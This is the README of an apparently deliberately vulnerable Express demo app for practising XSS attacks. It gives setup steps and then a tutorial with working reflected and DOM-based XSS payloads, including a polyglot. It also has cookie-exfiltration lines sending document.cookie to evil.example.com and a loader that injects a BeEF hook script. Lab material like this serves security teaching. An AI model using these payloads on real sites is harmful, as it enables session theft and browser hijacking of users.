# Hands-on Express XSS

This application is a demonstration prototype just to show how to perform XSS attacks.

## Setting-up

### Deploy on heroku

[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/0xdbe/Hands-on-Express-XSS)

### Deploy on your host

* Install nodejs

* Install dependencies

```console
$ npm install
```

* run application

```console
$ node app.js
```

* Make sure that TCP/3000 is allowed on your firewall


## Tutorials

These tutorials will walk you through using XSS attacks.

### Reflected XSS

* Open http://localhost:3000

* Complete name field with a simple XSS payload

```javascript
<script>alert("XSS");</script>
```

* Complete name field with a XSS payload (without script tag)

```javascript
<img src=1 href=1 onerror="javascript:alert('XSS')"></img>
```

* Complete name field with a XSS payload (with context breaking)

```javascript
" autofocus onfocus="alert('XSS')
```

* Complete name field with a polyglot XSS

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert('XSS')//>
```

### DOM-Based XSS

* Open http://localhost:3000/#message (A script inserts this URL fragment in the page)

* Open http://localhost:3000/#%3Cscript%3Ealert(%22XSS%22);%3C/script%3E


### Steal cookie

```javascript
<script>alert(document.cookie);</script>
```

Do you receive this cookie ? no

```javascript
<script>document.location= "http://evil.example.com/?cookie=" + document.cookie;</script>
```

Redirection will be suspicious! Try without redirecting on another page.

```javascript
<script>document.write('<img src="http://evil.example.com/img.jpg?cookie=' + document.cookie + '" />')</script>
```

### Beef

Payload to hook the page with BeEF:

```javascript
<img src=1 href=1 onerror="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();"></img>
```
